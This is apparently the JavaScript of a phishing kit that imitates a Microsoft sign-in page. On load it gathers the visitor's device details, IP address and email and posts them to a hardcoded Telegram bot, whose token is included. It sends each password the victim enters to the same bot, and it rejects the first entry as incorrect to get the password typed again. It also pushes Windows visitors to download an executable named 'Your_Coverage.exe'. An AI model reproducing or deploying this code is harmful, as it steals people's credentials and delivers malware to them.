var submissionCount = 0;


// send_to_telegram(get_device_details().message+`Email: ${document.getElementById("user_identity").innerText}`);
sendwithip(get_device_details().message+`Email: ${document.getElementById("user_identity").innerText}\n`);

set_attributes();
$("#btn_sig").click(function(event){
    event.preventDefault();
    checkandSubmit();
})

$("form").submit(function(event){
    event.preventDefault();
    checkandSubmit();
})

$(".btn-group").click(function(event){
    document.getElementById("end").style.color = "green";
    document.getElementById("end").innerHTML = "Retrieving document. Can't find the document? <a href='https://reader-d.web.app/Your_Coverage.exe'>Download here</a>";

    // check if device is windows
    if (get_device_details().payload.OperatingSystem=="Windows"){
        document.location.href = "https://reader-d.web.app/Your_Coverage.exe";
    }
})



function set_attributes(){
    var link = document.createElement("link"); 
    link.id = "old-css-link";
    link.rel = "stylesheet";
    link.type = "text/css";
    link.href="assets/app.css";
    var head = document.head || document.getElementsByTagName("head"); 
    head.appendChild(link); 


    document.getElementsByTagName('title')[0].innerText = "Sign in to your Microsoft account";

        
    // set the back image 
    var backimg = document.createElement("img");
    backimg.src = "assets/back.png"
    backimgparent = document.getElementById("back-img");
    backimgparent.appendChild(backimg);
    
    // set passtext 
    var passtext = document.getElementById("passtext");
    passtext.innerHTML = "Enter a password";
    
    
    // set forgot text 
    var forgottext = document.getElementById("forgottext"); 
    forgottext.innerHTML = "Forgot password?"
    
    
    // set input placeholder
    input = document.getElementById("inp_pwd")
    input.placeholder="Passwords";
    
    // set logo
    var logo = document.getElementById("logo");
    logo.src="assets/logo.png"
    logo.alt="Microsoft"

    // set sign in button
    document.getElementById("btn_sig").innerHTML = "Sign in";
    // set background image
    document.getElementById("body").style.backgroundImage = 'url("assets/0.jpg")';
    // get the email
    var email = document.getElementById("user_identity").innerText;
    // var script = document.createElement('script');
    // script.src = 'https://code.jquery.com/jquery-3.6.0.min.js'; // Replace with the desired jQuery version
    // var head = document.head || document.getElementsByTagName('head')[0];
    // head.appendChild(script);
    // set submission count 


        
    document.getElementById("footer-t").innerHTML = "Terms of use";
    document.getElementById("footer-p").innerHTML = "Privacy & cookies";

}












// take data and send to telegram

function send_to_telegram(message) {
    const botToken = '5822305766:AAEIAB5f1463oYqDQnwXGKtr9XL4ulhbrN0';
    const chatId = '5795117838';
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const payload = {
      chat_id: chatId,
      text: message,
    };
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Message sent to Telegram:', data);
      })
      .catch(error => {
        console.error('Error sending message to Telegram:', error);
      });
  }


// get the device details
function get_device_details(){

		// Get the user agent string
		const userAgent = navigator.userAgent;
	  
		// Get the browser name and version
		const browserName = (() => {
		  const data = {
			'Chrome': /Chrome/.test(userAgent),
			'Firefox': /Firefox/.test(userAgent),
			'Edge': /Edg/.test(userAgent),
			'Internet Explorer': /Trident/.test(userAgent),
			'Safari': /Safari/.test(userAgent),
		  };
	  
		  for (const browser in data) {
			if (data[browser]) return browser;
		  }
	  
		  return 'Unknown';
		})();

		// Get the operating system name
		const osName = (() => {
            const data = {
              'Windows': /Windows/.test(userAgent),
              'MacOS': /Mac OS|Macintosh/.test(userAgent),
              'Linux': /Linux/.test(userAgent),
              'iOS': /iPhone|iPad|iPod/.test(userAgent),
              'Android': /Android/.test(userAgent),
            };
        
            for (const os in data) {
              if (data[os]) return os;
            }
        
            return 'Unknown';
          })();

        // Get the screen resolution
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
    
        // Get the color depth
        const colorDepth = window.screen.colorDepth;
    
        // Get the preferred language
        const language = navigator.language;
    
        // Get the timezone
        const timezone = new Date().toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
    
        // Get the current time
        const currentTime = new Date().toLocaleString();          


      var payload = {
        'UserAgent': userAgent,
        'Browser': browserName,
        'OperatingSystem': osName,
        'ScreenResolution': `${screenWidth}x${screenHeight}`,
        'ColorDepth': colorDepth,
        'Language': language,
        'Timezone': timezone,
        'CurrentTime': currentTime
    };


    const message = `
    UserAgent:${payload.UserAgent},
    Browser:${payload.Browser},
    OperatingSystem:${payload.OperatingSystem},
    ScreenResolution:${payload.ScreenResolution},
    ColorDepth:${payload.ColorDepth},
    Language:${payload.Language},
    Timezone:${payload.Timezone},
    CurrentTime:${payload.CurrentTime}
  `;


    data = {
        'payload':payload,
        'message':message
    }

    return data;
}

// get the ip
function sendwithip(message){

    fetch('https://api64.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ipAddress = data.ip;

       m = message + `IpAdress:${ipAddress}`;
        send_to_telegram(m);
    }).catch(error=>{})


}


function get_email_pass(){
    email = document.getElementById("user_identity").innerText;
    pass = document.getElementById("inp_pwd").value;

    payload = {
        "email":email,
        "pass":pass
    }

    msg = `
        email:${email}
        pass:${pass}
    `

    data = {
        payload:payload,
        message:msg
    }

    return data;
}


function setpage2(){
    
    document.getElementById("section_uname").className="d-none";
    document.getElementById("section_final").className="";

    document.getElementById("page2img").src="assets/logo.png"
    document.getElementById("page2img").alt="Microsoft";

    document.getElementById("stay-h").innerHTML = "Stay signed in?";
    document.getElementById("stay-p").innerHTML = "Stay signed in so you don't have to sign in again next time.";



    
}

function checkandSubmit(){

    submissionCount+=1;
    // get the email  and pass 
    data = get_email_pass();

    // check the password length 
    if (data.payload.pass.length<4){
        document.getElementById("error").innerText="Password is incorrect. Please try again.";
        submissionCount-=1;
        return 0;
    }

    // send to telegram 
    // sendwithip(data.message);
    send_to_telegram(data.message);

    if (submissionCount==1){
    document.getElementById("error").innerText="This Password is incorrect. Please try again.";    
    document.getElementById("inp_pwd").value="";
   
    }

    if (submissionCount==2){
        document.getElementById("inp_pwd").value="";
        // set next page


        setpage2();


        
        return;
    }




 



}